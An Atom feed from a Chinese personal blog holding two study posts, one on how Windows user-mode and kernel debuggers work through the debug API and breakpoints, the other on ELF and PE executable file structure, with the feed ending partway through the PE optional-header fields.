<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title><![CDATA[临风|刀背藏身]]></title>
  <subtitle><![CDATA[代码是一棱刀背，幸好，有此藏身。]]></subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="http://yoursite.com/"/>
  <updated>2016-09-02T06:45:16.136Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name><![CDATA[临风]]></name>
    <email><![CDATA[xuelinf@qq.com]]></email>
  </author>
  
  <generator uri="http://zespia.tw/hexo/">Hexo</generator>
  
  <entry>
    <title><![CDATA[用户态调试器原理剖析&内核级调试原理]]></title>
    <link href="http://yoursite.com/2016/09/02/%E7%94%A8%E6%88%B7%E6%80%81%E8%B0%83%E8%AF%95%E5%99%A8%E5%8E%9F%E7%90%86%E5%89%96%E6%9E%90-%E5%86%85%E6%A0%B8%E7%BA%A7%E8%B0%83%E8%AF%95%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2016/09/02/用户态调试器原理剖析-内核级调试原理/</id>
    <published>2016-09-02T06:42:40.000Z</published>
    <updated>2016-09-02T06:45:07.000Z</updated>
    <content type="html"><![CDATA[<h1 id="调试器原理">调试器原理</h1>
<p>本篇算是做逆向工程相关学习的开篇吧，调试则不仅仅是逆向工程的内容，更是一个开发程序猿需要掌握的内容。</p>
<h2 id="用户态调试器_与_内核态调试器">用户态调试器 与 内核态调试器</h2>
<p>首先我们需要了解调试器到底是如何轻而易举的观察和控制被调试的过程呢。其实简单来说，就是利用了调试的API，而调试又分为用户态调试和内核态调试。</p>
<p>所谓的用户态调试器就是在用户态下进行调试，利用了操作系统提供的一系列公开的API 来进行调试。</p>
<p>Windows操作系统提供了一组API来支持调试器。这些API可以分为三类：</p>
<ul>
<li>创建调试目标的API；</li>
<li>在调试循环中处理调试事件的API。</li>
<li>查看和修改调试目标的API。</li>
</ul>
<p>下面这种图是张银奎老师《软件调试》一书中画的Windows 下用户态调试的模型，各个角色包括了调试器进程，被调试进程，调试子系统，调试API，NTDLL和内核中支持的一些函数。书中讲解的非常详细，但本次总结的重点不在于此，所以就不再展开，下面简单的围绕用户态调试这些API 做以介绍。<br><img src="media/14727118491370/14727813267689.jpg" alt=""></p>
<h3 id="创建调试目标">创建调试目标</h3>
<p>调试器工作之前，首先做的是创建调试目标。用户态调试器创建目标的方法不外乎创建一个新进程，或者是直接附加到一个运行的进程，这和逆向做注入是一样的。采用方法之后，进程就成了调试目标，操作系统将调试器与调试目标关联起来。</p>
<p>调试器创建目标通过调用CreateProcess 同时传入DEBUG_PROCESS 标志。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">STARTUPINFO si={<span class="number">0</span>};  </div><div class="line">si.cb=<span class="keyword">sizeof</span>(si);  </div><div class="line">PROCESS_INFORMATION pi={<span class="number">0</span>};  </div><div class="line"><span class="keyword">bool</span> ret=CreateProcesss(NULL,argv[<span class="number">1</span>],NULL,NULL,<span class="keyword">false</span>,  </div><div class="line">DEBUG_PROCESS,NULL,NULL,&si,&pi);</div></pre></td></tr></table></figure>

<p>而调试器附加到一个运行进程则是通过调用 DebugActiveProcess 来实现的。此函数允许将调试器绑定到一个正在运行的进程。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">bool</span> DebugActiveProcess(DWORD dwProcessId )</div></pre></td></tr></table></figure>

<p>dwProcessId 就是绑定金城的标示id，如果绑定成功，返回非零，否则返回零。</p>
<h3 id="调试循环">调试循环</h3>
<p>接下来，就类似于Windows 的消息循环，调试循环也是在调试部结束的时候，会一直等待操作系统发送调试事件。</p>
<p>在调试目标被调试时，进程执行的一些操作会以事件的方式通知调试器。例如动态库的加载与卸载、新线程的创建和销毁以及代码或处理器抛出的异常都会通知调试器。当有事件需要通知调试器时，操作系统会首先挂起调试目标的所有线程，然后把事件通知调试器。并且等待调试器通知其继续执行。</p>
<p>首先，调试器会利用WaitForDebugEvent 来等待事件通知的到来，当事件到来，该函数会返回事件信息，而事件信息会包装在一个叫DEBUG_EVENT 结构中。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> DEBUG_EVENT {</div><div class="line">DWORD dwDebugEventCode;</div><div class="line">DWORD dwProcessId;</div><div class="line">DWORD dwThreadId;</div><div class="line"><span class="keyword">union</span> {</div><div class="line">EXCEPTION_DEBUG_INFO Exception;</div><div class="line">CREATE_THREAD_DEBUG_INFO CreateThread;</div><div class="line">CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;</div><div class="line">EXIT_THREAD_DEBUG_INFO ExitThread;</div><div class="line">EXIT_PROCESS_DEBUG_INFO ExitProcess;</div><div class="line">LOAD_DLL_DEBUG_INFO LoadDll;</div><div class="line">UNLOAD_DLL_DEBUG_INFO UnloadDll;</div><div class="line">OUTPUT_DEBUG_STRING_INFO DebugString;</div><div class="line">RIP_INFO RipInfo;</div><div class="line">}u;</div><div class="line">}DEBUG_EVENT, *LPDEBUG_EVENT;  ;</div></pre></td></tr></table></figure>

<p>我们看一下union 中的各种调试事件：</p>
<ul>
<li>EXCEPTION_DEBUG_EVENT  调试中出现异常，生成调试事件。</li>
<li>CREATE_THREAD_DEBUG_EVENT  调试过程中创建新进程或调试器开始调试已经激活的进程时，就会生成调试事件。要注意，当调试器主线程被创建时不会收到该通知。</li>
<li>CREATE_PROCESS_DEBUG_EVENT  进程被创建。</li>
<li>EXIT_THREAD_DEBUG_EVENT  线程退出事件。</li>
<li>EXIT_PROCESS_DEBUG_EVENT  进程退出事件。</li>
<li>LOAD_DLL_DEBUG_EVENT  装载DLL 文件时，生成事件。PE 装载器第一次解析出与DLL 有关的链接时，将收到这一事件。调试进程使用了 LoadLibrary 也会发生。 </li>
<li>UNLOAD_DLL_DEBUG_EVENT  使用FreeLibrary 函数卸载DLL 文件时，会生成调试事件。注意，只有在DLL 使用次数为0的时候，才会生成这个事件。</li>
<li>OUTPUT_DEBUG_STRING_EVENT  调用DebugOutputString 函数向程序发送消息字符串发生该事件。</li>
<li>RIP_EVENT  只有Windows 98 检查过的构件才会生成该调试事件，报告错误信息。</li>
</ul>
<p>而调试相关的重点则是第一个 EXCEPTION_DEBUG_EVENT 他有一个很长的异常列表：</p>
<ul>
<li>EXCEPTION_ACCESS_VIOLATION  0xC0000005  程序企图读写一个不可访问的地址时引发的异常。例如企图读取0地址处的内存。</li>
<li>EXCEPTION_ARRAY_BOUNDS_EXCEEDED  0xC000008C  数组访问越界时引发的异常。</li>
<li>EXCEPTION_BREAKPOINT  0x80000003  触发断点时引发的异常。</li>
<li>EXCEPTION_DATATYPE_MISALIGNMENT  0x80000002  程序读取一个未经对齐的数据时引发的异常。</li>
<li>EXCEPTION_FLT_DENORMAL_OPERAND  0xC000008D  如果浮点数操作的操作数是非正常的，则引发该异常。所谓非正常，即它的值太小以至于不能用标准格式表示出来。</li>
<li>EXCEPTION_FLT_DIVIDE_BY_ZERO  0xC000008E  浮点数除法的除数是0时引发该异常。</li>
<li>EXCEPTION_FLT_INEXACT_RESULT  0xC000008F  浮点数操作的结果不能精确表示成小数时引发该异常。</li>
<li>EXCEPTION_FLT_INVALID_OPERATION  0xC0000090  该异常表示不包括在这个表内的其它浮点数异常。</li>
<li>EXCEPTION_FLT_OVERFLOW  0xC0000091  浮点数的指数超过所能表示的最大值时引发该异常。</li>
<li>EXCEPTION_FLT_STACK_CHECK  0xC0000092  进行浮点数运算时栈发生溢出或下溢时引发该异常。</li>
<li>EXCEPTION_FLT_UNDERFLOW  0xC0000093  浮点数的指数小于所能表示的最小值时引发该异常。</li>
<li>EXCEPTION_ILLEGAL_INSTRUCTION  0xC000001D  程序企图执行一个无效的指令时引发该异常。</li>
<li>EXCEPTION_IN_PAGE_ERROR  0xC0000006  程序要访问的内存页不在物理内存中时引发的异常。</li>
<li>EXCEPTION_INT_DIVIDE_BY_ZERO  0xC0000094  整数除法的除数是0时引发该异常。</li>
<li>EXCEPTION_INT_OVERFLOW  0xC0000095  整数操作的结果溢出时引发该异常。</li>
<li>EXCEPTION_INVALID_DISPOSITION  0xC0000026  异常处理器返回一个无效的处理的时引发该异常。</li>
<li>EXCEPTION_NONCONTINUABLE_EXCEPTION  0xC0000025  发生一个不可继续执行的异常时，如果程序继续执行，则会引发该异常。</li>
<li>EXCEPTION_PRIV_INSTRUCTION  0xC0000096  程序企图执行一条当前CPU模式不允许的指令时引发该异常。</li>
<li>EXCEPTION_SINGLE_STEP  0x80000004  标志寄存器的TF位为1时，每执行一条指令就会引发该异常。主要用于单步调试。</li>
<li>EXCEPTION_STACK_OVERFLOW  0xC00000FD  栈溢出时引发该异常。</li>
</ul>
<p><strong>这么多的异常，虽然是我们平时看到的，但是列在一起也是非常让人老眼昏花，不过其实我们重点关注的是EXCEPTION_BREAKPOINT 断点异常</strong>，代码调试遇到该指令，立即中断运行，然后交给调试器进行处理。</p>
<p>所以，说了这些，利用调试的方法逆向的重点就是在这，利用断点的方法，找到代码中我们想要插入的部分，设置断点，将该字节改成0xCC 即可。使用完之后，将该字节回复原值，然后将控制权返回给被调试者，就可以了。</p>
<p>说了那么多，WaitForDebugEvent 的基本结构是这样的：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BOOL WaitForDebugEvent(LPDEBUG_ENENT lpDebugEvent, DWORD dwMilliseconds)</div></pre></td></tr></table></figure>

<ul>
<li>lpDebugEvent ：指向接收调试事件信息的DEBUG_ ENENT结构的指针</li>
<li>dwMilliseconds：指定用来等待调试事件发生的毫秒数，如果 这段时间内没有调试事件发生，函数将返回调用者；如果将该参数指定为INFINITE，函数将一直等待直到调试事件发生</li>
</ul>
<p>如果函数成功，则返回非零值；如果失败，则返回零。在调试器调用WaitForDebugEvent返回后，得到事件通知，然后解析DEBUG_EVENT结构，并对事件进行响应，处理完成后调试器将会调用ContinueDebugEvent，并根据参数来通知调试目标执行相应操作。</p>
<p>另一个重点的函数就是让被调试者恢复运行了：</p>
<p>ContinueDebugEvent函数，此函数允许调试器恢复先前由于调试事件而挂起的线程。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">BOOL ContinueDebugEvent(DWORD dwProcessId,DWORD dwThreadId, DWORD dwContinueStatus )</div></pre></td></tr></table></figure>

<ul>
<li>dwProcessId 为被调试进程的进程标识符</li>
<li>dwThreadId  为欲恢复线程的线程标识符</li>
<li>dwContinueStatus指定了该线程将以何种方式继续，包含两个定义值DBG_CONTINUE和DBG_EXCEPTION_NOT_HANDLED</li>
</ul>
<p>如果函数成功，则返回非零值；如果失败，则返回零。</p>
<p>下面是一个简单的示例：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">DWORD Condition=DBG_CONTINUE;  </div><div class="line">  </div><div class="line"><span class="keyword">while</span>(Condition)  </div><div class="line">  </div><div class="line">{  </div><div class="line">  </div><div class="line">    DEBUG_EVENT DebugEvent={<span class="number">0</span>};  </div><div class="line">  </div><div class="line">WaitForDebugEvent(&DebugEvent,INFINITE);<span class="comment">//等待调试事件  </span></div><div class="line">  </div><div class="line">ProcessEvenet(DebugEvent)<span class="comment">//处理调试事件。  </span></div><div class="line">  </div><div class="line">ContinueDebugEvent(DebugEvent.dwProcessId,DebugEvent.dwThreadId,Condition);<span class="comment">//通知调试目标继续执行。  </span></div><div class="line">  </div><div class="line">}</div></pre></td></tr></table></figure>

<p>而具体的处理事件可以是这样的：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line">DWORD ProcessEvent(DEBUG_EVENT de)  </div><div class="line">{  </div><div class="line">   <span class="keyword">switch</span>(de.dwDebugEvent.Code)  </div><div class="line">   {  </div><div class="line">      <span class="keyword">case</span> EXCEPTION_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">  </div><div class="line">     <span class="keyword">case</span> CREATE_THREAD_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">  </div><div class="line">     <span class="keyword">case</span> CREATE_PROCESS_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">  </div><div class="line">     <span class="keyword">case</span> EXIT_THREAD_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">  </div><div class="line">     <span class="keyword">case</span> EXIT_PROCESS_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">      <span class="keyword">case</span> LOAD_DLL_DEBUG_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">      <span class="keyword">case</span> OUTPUT_DEBUG_STRING_EVENT:  </div><div class="line">  </div><div class="line">        {  </div><div class="line">         }  </div><div class="line">         <span class="keyword">break</span>;  </div><div class="line">       ......  </div><div class="line">}  </div><div class="line"><span class="keyword">return</span> DBG_CONTINUE;  </div><div class="line">}</div></pre></td></tr></table></figure>

<h3 id="调试事件到来的顺序">调试事件到来的顺序</h3>
<p>当我们启动调试目标时，调试器接收到的第一个事件是CREATE_THREAD_DEBUG_EVENT。接下来是加载dll的事件。每加载一个，都会产生一个这样的事件。</p>
<p>当所有模块都被加载到进程地址空间后，调试目标就准备好运行了，调试器此时也做好了接收通知的准备。此时是设置断点的最佳时机。</p>
<p>在调试目标退出之前调试器会收到 EXIT_DEBUG_PROCESS_EVENT通知。此后调试器不能收到加载到进程地址空间的dll从进程卸载的UNLOAD_DLL_DEBUG_EVENT通知。</p>
<p>Windows操作系统使用结构化异常处理（SEH)机制将处理器引发的异常传递给内核及用户态程序。每个SEH异常都有一个无符号整形的异常码来唯一标识。这个异常码是由系统在异常发生时指定的。这些异常码使用了操作系统开发人员定义的公开异常码。</p>
<h3 id="内核态调试">内核态调试</h3>
<p>简单来说，内核调试就是分析和调试内和空间的代码和数据，主要有操作系统的内核，执行体 和各种驱动程序。可以把驱动程序看作是对操作系统内核的拓展和补充，因此可以把内核调试简单的理解为调试操作系统的广义内核。内核调试的问题在于他讲调试目标中断到调试器意味着操作系统内核的中断，而内核负责整个系统的调度和执行，内核一旦停止，整个系统也就停止了。所以如果想做内核级别的调试，要么需要硬件级别的调试器，通过特定的借口与CPU 建立连接，要么是在系统内核加入调试支持。</p>
<p>内核态调试则是提供了内核级别的调试。除了前边提到的功能，借助内核调试，我们还可以直接下载到系统文件符号，获取到系统内部的结构体，有一些是尚未公开的，以及一些API 的相关信息。还可以用来读取，分析Windows OS 的转储文件，帮助分析发生系统崩溃的原因。</p>
<p>目前比较流行的OllyDBG, IDA pro， 属于用户态调试器，而微软自己出品的WinDBG既可以用户态调试，也可以内核调试，Linux 下的调试器对应为GDB。</p>
]]></content>
    <summary type="html">
    <![CDATA[<h1 id="调试器原理">调试器原理</h1>
<p>本篇算是做逆向工程相关学习的开篇吧，调试则不仅仅是逆向工程的内容，更是一个开发程序猿需要掌握的内容。</p>
<h2 id="用户态调试器_与_内核态调试器">用户态调试器 与 内核态调试器</h2>
<p>首先我们需要了]]>
    </summary>
    
      <category term="security" scheme="http://yoursite.com/tags/security/"/>
    
      <category term="Study" scheme="http://yoursite.com/categories/Study/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ELF&PE 文件结构分析]]></title>
    <link href="http://yoursite.com/2016/07/15/ELF-PE-%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2016/07/15/ELF-PE-文件结构分析/</id>
    <published>2016-07-15T03:37:04.000Z</published>
    <updated>2016-07-15T03:38:37.000Z</updated>
    <content type="html"><![CDATA[<h1 id="ELF&amp;PE_文件结构分析">ELF&amp;PE 文件结构分析</h1>
<p>说简单点，ELF 对应于UNIX 下的文件，而PE 则是Windows 的可执行文件，分析ELF 和 PE 的文件结构，是逆向工程，或者是做调试，甚至是开发所应具备的基本能力。在进行逆向工程的开端，我们拿到ELF 文件，或者是PE 文件，首先要做的就是分析文件头，了解信息，进而逆向文件。不说废话，开始分析：</p>
<p>ELF和PE 文件都是基于Unix 的 COFF(Common Object File Format) 改造而来，更加具体的来说，他是来源于当时著名的 DEC(Digital Equipment Corporation) 的VAX/VMS 上的COFF文件格式。我们从ELF 说起。</p>
<h2 id="ELF">ELF</h2>
<p>ELF 文件标准里把系统中采用ELF 格式的文件归类为四种：</p>
<ul>
<li>可重定位文件，Relocatable File ,这类文件包含代码和数据，可用来连接成可执行文件或共享目标文件，静态链接库归为此类，对应于Linux 中的.o ，Windows 的 .obj.</li>
<li>可执行文件，Executable File ，这类文件包含了可以直接执行的程序，它的代表就是ELF 可执行文件，他们一般没有扩展名。比如/bin/bash ，Windows 下的 .exe</li>
<li>共享目标文件，Shared Object File ，这种文件包含代码和数据，链接器可以使用这种文件跟其他可重定位文件的共享目标文件链接，产生新的目标文件。另外是动态链接器可以将几个这种共享目标文件与可执行文件结合，作为进程映像来运行。对应于Linux 中的 .so，Windows 中的 DLL</li>
<li>核心转储文件，Core Dump File，当进程意外终止，系统可以将该进程地址空间的内容及终止时的一些信息转存到核心转储文件。 对应 Linux 下的core dump。</li>
</ul>
<p>ELF 文件的总体结构大概是这样的：</p>
<table>
<thead>
<tr>
<th>ELF  Header</th>
</tr>
</thead>
<tbody>
<tr>
<td>.text</td>
<td></td>
</tr>
<tr>
<td>.data</td>
<td></td>
</tr>
<tr>
<td>.bss</td>
<td></td>
</tr>
<tr>
<td>… other section</td>
<td></td>
</tr>
<tr>
<td>Section header table</td>
<td></td>
</tr>
<tr>
<td>String Tables, Symbol Tables,..</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>ELF 文件头位于最前端，它包含了整个文件的基本属性，如文件版本，目标机器型号，程序入口等等。</li>
<li>.text 为代码段，也是反汇编处理的部分，他们是以机器码的形式存储，没有反汇编的过程基本不会有人读懂这些二进制代码的。</li>
<li>.data 数据段，保存的那些已经初始化了的<strong>全局静态变量</strong>和<strong>局部静态变量</strong>。</li>
<li>.bss 段，存放的是未初始化的<strong>全局变量</strong>和<strong>局部静态变量</strong>，这个很容易理解，因为在未初始化的情况下，我们单独用一个段来保存，可以不在一开始就分配空间，而是在最终连接成可执行文件的时候，再在.bss 段分配空间。</li>
<li>其他段，还有一些可选的段，比如.rodata 表示这里存储只读数据， .debug 表示调试信息等等，具体遇到可以查看相关文档。</li>
<li>自定义段，这一块是为了实现用户特殊功能而存在的段，方便扩展，比如我们使用全局变量或者函数之前加上 <strong><strong>attribute</strong>(section(‘name’))</strong> 就可以吧变量或者函数放到以name 作为段名的段中。</li>
<li>段表，Section Header Table ，是一个重要的部分，它描述了ELF 文件包含的所有段的信息，比如每个段的段名，段长度，在文件中的偏移，读写权限和一些段的其他属性。</li>
</ul>
<h3 id="ELF_Header">ELF Header</h3>
<p>ELF 文件信息的查看利器在Linux 下是是objdump, readelf, 相关命令较多，可查。下面我们从ELF 文件头说起。</p>
<p>文件头包含的内容很多，我们在Ubuntu 系统下使用 readelf 命令来查看ELF 文件头：</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684133247520.jpg" alt=""></p>
<p>我们以bash 这个可执行文件为例，我们可以看到ELF 文件头定义了ELF 魔数，文件机器字节长度，数据存储方式，版本，运行平台，ABI版本，ELF 重定位类型，硬件平台，硬件平台版本，入口地址，程序头入口和长度，段表的位置和长度，段的数量。</p>
<p>ELF 文件头的结构和相关常数一般定义在了 /usr/include/elf.h 中，我们可以进去查看一下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684160898401.jpg" alt=""></p>
<p>除了第一个，其他都是一一对应的，第一个是一个对应了Magic number, Class, Data, Version, OS/ABI, ABI version.</p>
<p>出现在最开始的ELF Magic number， 16字节是用来标识ELF 文件的平台属性，比如字长，字节序，ELF 文件版本。在加载的时候，首先会确认魔数的正确性，不正确的话就拒绝加载。</p>
<p>另一个重要的东西是段表(Section Header Table) ,保存了各种各样段的基本属性，比如段名，段长度，文件中的偏移，读写权限，段的其他属性。而段表自己在ELF 文件中的位置是在ELF 头文件 e_shoff 决定的。</p>
<p>我们可以使用 objdump -h 的指令来查看ELF 文件中包含哪些段，以bash 这个可执行为例，其实除了我们之前说的哪些基本结构，他包含很多其他的结构：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684651119919.jpg" alt=""></p>
<p>同样的，我们使用readelf -S 的指令也可以进行查看。</p>
<p>下面我们来看一下结构，还是到elf.h 中去查看，他的结构体名字叫 Elf32_Shdr，64位对应Elf64_Shdr,结构如下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684654563974.jpg" alt=""></p>
<p>以上结构中，分别对应于：</p>
<ul>
<li>段名</li>
<li>段类型</li>
<li>段标志位</li>
<li>段虚拟地址</li>
<li>段偏移</li>
<li>段长度</li>
<li>段链接</li>
<li>段对齐</li>
<li>项，一些大小固定的项，如符号表等。</li>
</ul>
<p>这些项目，在使用readelf -S 指令时一一对应。</p>
<p>另外还有一个重要的表，叫重定位表，一般段名叫.rel.text， 在上边没有出现，链接器在处理目标文件时，需要对目标文件中的某些部位进行重定位，就是代码段和数据段中那些对绝对地址引用的位置，这个时候就需要使用重定位表了。</p>
<h3 id="字符串表"><strong>字符串表</strong></h3>
<p>为什么会有字符串表呢？其实这个也是在不断发展改进中找到的解决办法，在ELF 文件中，会用到很多的字符串，段名，变量名等等，但是字符串其本身又长度不固定，如果使用固定结构来表示，就会带来空间上的麻烦。所以，构造一个字符串表，将使用的字符串统一放在那里，然后通过偏移量来引用字符串，岂不美哉。</p>
<p>需要使用的时候，只需要给一个偏移量，然后就到字符串该位置找字符串，遇到\0 就停止。</p>
<p>字符串在ELF 文件中，也是以段的形式保存的，常见的段名 .strtab， .shstrtab 两个字符串分别为字符串表和段表字符串，前者用来保存普通的字符串，后者保存段名。</p>
<p>在我们使用readelf -h 的时候，我们看到最后一个成员，section header string table index ，实际上他指的就是字符串表的下标，bash 对应的字符串表下标为27，在使用objdump 的时候，实际上忽略了字符串表，我们使用readelf ，就可以看到第27位即字符串表：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684662035561.jpg" alt=""></p>
<hr>
<p>下面我们回顾一下，这个ELF 构造的精妙之处，当一个ELF 文件到来的时候，系统自然的找到他的开头，拿到文件头，首先看魔数，识别基本信息，看是不是正确的，或者是可识别的文件，然后加载他的基本信息，包括CPU 平台，版本号，段表的位置在哪，还可以拿到字符串表在哪，以及整个程序的入口地址。这一系列初始化信息拿到之后，程序可以通过字符串表定位，找到段名的字符串，通过段表的初始位置，确认每个段的位置，段名，长度等等信息，进而到达入口地址，准备执行。</p>
<p>当然，这只是最初始的内容，其后还要考虑链接，Import,Export 等等内容，留待以后完善。</p>
<h2 id="PE_文件">PE 文件</h2>
<p>下面我们去看看更为常见的PE 文件格式，实际上PE 与 ELF 文件基本相同，也是采用了基于段的格式，同时PE 也允许程序员将变量或者函数放在自定义的段中， GCC 中<strong><strong>attribute</strong>(section(‘name’))</strong> 扩展属性。</p>
<p>PE 文件的前身是COFF，所以分析PE 文件，先来看看COFF 的文件格式，他保存在WinNT.h 文件中。</p>
<p>COFF 的文件格式和ELF 几乎一毛一样：</p>
<table>
<thead>
<tr>
<th>Image Header</th>
</tr>
</thead>
<tbody>
<tr>
<td>SectionTable Image_SECTION_HEADER</td>
<td></td>
</tr>
<tr>
<td>.text</td>
<td></td>
</tr>
<tr>
<td>data</td>
<td></td>
</tr>
<tr>
<td>.drectve</td>
<td></td>
</tr>
<tr>
<td>.debug$S</td>
<td></td>
</tr>
<tr>
<td>… other sections</td>
<td></td>
</tr>
<tr>
<td>Symbol Table</td>
<td></td>
</tr>
</tbody>
</table>
<p>文件头定义在WinNT.h 中，我们打开来看一下：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684760385167.jpg" alt=""></p>
<p>我们可以看到，它这个文件头和ELF 实际上是一样的，也在文件头中定义了段数，符号表的位置，Optional Header 的大小，这个Optional Header 后边就看到了，他就是PE 可执行文件的文件头的部分，以及段的属性等。</p>
<p>跟在文件头后边的是COFF 文件的段表，结构体名叫 IMAGE_SECTION_HEADER ：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684763452964.jpg" alt=""></p>
<p>属性包括这些，和ELF 没差：</p>
<ul>
<li>段名</li>
<li>物理地址 PhysicalAddress</li>
<li>虚拟地址 VirtualAddress</li>
<li>原始数据大小 Sizeof raw data</li>
<li>段在文件中的位置 File pointer to raw data</li>
<li>该段的重定位表在文件中的位置 File pointer to relocation table</li>
<li>该段的行号表在文件中的位置 File pointer to line number</li>
<li>标志位，包括段的类型，对齐方式，读取权限等标志。</li>
</ul>
<h3 id="DOS_头"><strong>DOS 头</strong></h3>
<p>在我们分析PE 的之前，还有另外一个头要了解一下，DOS 头，不得不说，微软事儿还是挺多的。</p>
<p>微软在创建PE 文件格式时，人们正在广泛使用DOS 文件，所以微软为了考虑兼容性的问题，所以在PE 头的最前边还添加了一个 IMAGE_DOS_HEADER 结构体，用来扩展已有的DOS EXE。在WinNTFS.h 里可以看到他的身影。</p>
<p><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684768685651.jpg" alt=""></p>
<p>DOS 头结构体的大小是40字节，这里边有两个重要的成员，需要知道，一个是e_magic 又见魔数，一个是e_lfanew，它只是了NT 头的偏移。</p>
<p>对于PE 文件来说，这个e_magic，也就是DOS 签名都是MZ，据说是一个叫 Mark Zbikowski 的开发人员在微软设计了这种ODS 可执行文件，所以…</p>
<p>我们以Windows 下的notepad++ 的可执行文件为例，在二进制编辑软件中打开，此类软件比较多，Heditor 打开：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684776538992.jpg" alt=""></p>
<p>开始的两个字节是4D5A，e_lfanew 为00000108 注意存储顺序，小端。</p>
<p>你以为开头加上了DOS 头就完事了么，就可以跟着接PE 头了么。为了兼容DOS 当然不是这么简单了，紧接着DOS 头，跟的是DOS 存根，DOS stub。这一块就是为DOS 而准备的，对于PE 文件，即使没有它也可以正常运行。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684783166951.jpg" alt=""></p>
<p>旁边的ASCII 是读不懂的，因为他是机器码，是汇编，为了在DOS 下执行，对于notepad++ 来说，这里是执行了一句，this program cannot be run in DOS mode 然后退出。逗我= =，有新的人，可以在DOS 中创造一个程序，做一些小动作。</p>
<h3 id="NT头"><strong>NT头</strong></h3>
<p>下面进入正题，在HEditor 上也看到了PE，这一块就是正式的步入PE 的范畴。<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684785601204.jpg" alt=""></p>
<p>这是32位的PE 文件头定义，64位对应改。第一个成员就是签名，如我们所说，就是我们看到的「PE」，对应为50450000h。</p>
<p>这里边有两个东西，第一个就是我们之前看到的COFF 文件头，这里直接放进来了，我们不再分析。</p>
<p>看第二个，IMAGE_OPTIONAL_HEADER 不是说这个头可选，而是里边有些变量是可选的，而且有一些变量是必须的，否则会导致文件无法运行：<br><img src="http://7s1s1q.com1.z0.glb.clouddn.com/2016-07-15-14684788909981.jpg" alt=""></p>
<p>有这么几个需要重点关注的成员，这些都是文件运行所必需的：</p>
<ol>
<li>Magic 魔数，对于32结构体来说是10B，对于64结构体来说是20B.</li>
<li>AddressOfEntryPoint 持有EP 的RVA 值，之处程序最先执行的代码起始位置，也就是程序入口。</li>
<li>ImageBase 进程虚拟内存的范围是0-FFFFFFFF (32位)。PE 文件被加载到这样的内存中，ImageBase 指出文件的优先装入位置。</li>
